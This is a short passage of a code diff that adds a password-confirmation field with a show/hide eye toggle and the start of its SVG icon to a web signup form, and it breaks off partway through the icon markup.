+                <div class="pass-wrapper">
+                    <input type="password" id="signupConfirm" class="input-box" placeholder="Password" required oninput="validateSignupForm()">
+                    <div class="eye-toggle" onclick="togglePasswordVisibility('signupConfirm')">
+                        <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="
